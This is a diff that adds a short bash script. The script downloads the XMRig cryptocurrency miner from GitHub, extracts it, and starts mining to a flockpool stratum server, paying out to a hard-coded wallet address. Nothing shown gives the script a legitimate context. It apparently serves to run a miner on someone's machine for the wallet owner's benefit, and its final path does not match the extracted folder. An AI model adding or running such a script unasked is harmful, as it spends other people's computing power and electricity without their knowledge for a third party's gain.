@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
+tar xf xmrig-6.16.2-linux-static-x64.tar.gz
+/xmrig-6.16.2/xmrig -a gr -o stratum+tcp://asia-small.flockpool.com:4444 -u RXXziFx5W2TvZM2B2vrRNbazzmMcAAmYiS.ASI
